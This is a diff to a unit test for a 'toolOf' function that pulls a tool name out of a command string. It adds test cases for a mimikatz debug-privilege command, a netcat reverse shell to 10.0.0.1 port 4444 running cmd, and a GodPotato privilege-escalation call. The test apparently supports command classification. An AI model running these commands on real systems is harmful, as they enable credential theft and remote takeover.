@@ -39,5 +39,8 @@ describe('toolOf', () => {
     ['python3 -m http.server 80', 'python3'],
     ['  ', ''],
     ['echo x | base64', 'echo'],
+    ['.\\mimikatz.exe "privilege::debug"', 'mimikatz'],
+    ['C:\\Windows\\Temp\\nc.exe 10.0.0.1 4444 -e cmd', 'nc'],
+    ['GodPotato-NET4.exe -cmd x', 'GodPotato-NET4'],
   ])('%s -> %s', (cmd, tool) => { expect(toolOf(cmd)).toBe(tool) })
 })
